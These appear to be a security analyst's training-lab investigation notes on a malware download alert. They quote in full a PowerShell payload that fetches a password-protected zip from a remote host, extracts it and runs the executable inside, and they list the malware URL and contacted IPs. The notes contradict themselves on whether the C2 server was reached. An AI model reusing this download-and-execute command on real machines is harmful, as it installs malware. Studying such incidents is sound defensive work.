Show Hint

-Attack Vector?
file download injection attack
payload:
$url = 'https://files-ld.s3.us-east-2.amazonaws.com/service-installer.zip'; $dest = 'C:\temp\service-installer.zip'; $extractPath = 'C:\temp'; $password = 'infected'; if (-not (Test-Path -Path $extractPath)) { New-Item -ItemType Directory -Path $extractPath -Force | Out-Null }; Invoke-WebRequest -Uri $url -OutFile $dest; $7zipPath = 'C:\Program Files\7-Zip\7z.exe'; Start-Process -FilePath $7zipPath -ArgumentList "x -p$password -o$extractPath $dest" -NoNewWindow -Wait -PassThru; Remove-Item -Path $dest; Start-Process -FilePath "$extractPath\service_installer\svohost.exe"

url of the file containing malware:
https://files-ld.s3.us-east-2.amazonaws.com
malicious zip file name:
service-installer.zip

-
Static analysis of the malware file:
Virustotal:
identified as a win64 Exploit or Trojan by sources like Kaspersky Huorong
contacting ip address:184.27.218.92
contacting ip address:185.107.56.141

Dynamic analysis of the malware file:
-identified as a trojan/ win64 Exploit by Anyrun

is the c2c accessed?
yes since the malware has been executed
required containment

Final note:
The attack first tried to brute force different user ids and passwords and even managed to login successfully. the attack further involves delivering a payload containing javascript code to download and install a malicious file kept on a different web-page. Also the malware/executable file 'svohost.exe' was found as a win64 exploit that utilizes a heap buffer overflow. the attacker further sent command injection of whoami command to check whether the priveleges have been escalated or not. the victim however,managed to not access the c2c server ip. containment is recommended as malware has been executed.
